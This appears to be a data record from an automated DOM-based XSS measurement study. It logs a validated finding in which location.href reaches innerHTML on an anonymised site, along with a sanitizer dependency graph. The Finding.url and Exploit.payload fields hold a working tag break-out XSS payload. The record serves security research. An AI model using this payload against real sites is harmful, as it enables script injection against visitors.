// Finding: 95bb8011-6f51-4ebb-b400-4c5c75da62da
// Finding.url: https://www.example72.com/coronavirus/##</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('8c246a6b128449849697d8d0ab2ef6db')><!--/*
// Finding.parentloc: https://www.example72.com/coronavirus/##</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('8c246a6b128449849697d8d0ab2ef6db')><!--/*
// Finding.domain: www.example72.com
// Finding.base_domain: example72.com
// Finding.source: location.href
// Finding.sink: innerHTML
// Sanitizer.score: 1
// Sanitizer.name: <synthetic>
// Sanitizer.location: example18.com
// Finding.begin: 273
// Finding.end: 353
// Finding.original_uuid: 0fc8f7df-5168-44ed-84f7-96374a8afc52
// Finding.TwentyFiveMillionFlowsId: 420132770
// Finding.script: https://www.example72.com/assets/javascript/jquery-3.4.1.min.js
// Finding.line: 2
// Exploit.uuid: 8c246a6b-1284-4984-9697-d8d0ab2ef6db
// Exploit.success: true
// Exploit.status: validated
// Exploit.method: C
// Exploit.type: html
// Exploit.token: text
// Exploit.content: C
// Exploit.quote_type: None
// Exploit.tag: None
// Exploit.break_out: #</iframe></style></script></object></embed></textarea><img src=x onerror=
// Exploit.break_in: ><!--/*
// Exploit.payload: #</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
// Exploit.begin_taint_url: 15
// Exploit.end_taint_url: 16
// Exploit.replace_begin_url: 33
// Exploit.replace_end_url: 33
// Exploit.replace_begin_param: 160
// Exploit.replace_end_param: 160
// Issues.LargestEncodeAttrStringChain: 0
// Issues.LargestTextFragmentEncodeChainLength: 0
// Issues.HasApproximation: false
// Issues.HasMissingImplementation: false
// Issues.HasInfiniteRegexWithFunctionReplacer: false
// Issues.MergedSplitAndJoins: true
// Issues.HasUrlInRhsOfReplace: false
// Issues.HasUrlInLhsOfReplace: false
// Issues.HasCookieValueInLhsOfreplace: false
// Issues.HasCookieValueInRhsOfreplace: false
// Issues.HasCookieValueInMatchPattern: false
// Issues.HasCookieValueInExecPattern: false
// Issues.RemovedLRConcats: false
// Issues.RemovedReplaceArtifacts: false
// Issues.HasUrlInMatchPattern: false
// Issues.HasUrlInExecPattern: false
// Issues.RemovedNOPreplaces: false
// Issues.Known_sanitizer: false
// DepGraph.hash: 286204396
// DepGraph.sanitizer_hash: -463482283
// Merged split and join statements 
digraph cfg {
n0 [shape=house, label="Input: x"];
n1 [shape=ellipse, label="str_replace_once"];
n2 [shape=box, label="RegExp: /(\?.*)$/"];
n3 [shape=box, label="Lit: "];
n4 [shape=box, label="Var: x"];
n5 [shape=ellipse, label="preg_replace"];
n6 [shape=box, label="RegExp: /\//"];
n7 [shape=box, label="Lit: /"];
n8 [shape=box, label="Var: x"];
n9 [shape=box, label="Var: x"];
n10 [shape=doubleoctagon, label="Return: x"];
n4 -> n0;
n1 -> n2;
n1 -> n3;
n1 -> n4;
n8 -> n1;
n5 -> n6;
n5 -> n7;
n5 -> n8;
n9 -> n5;
n10 -> n9;
}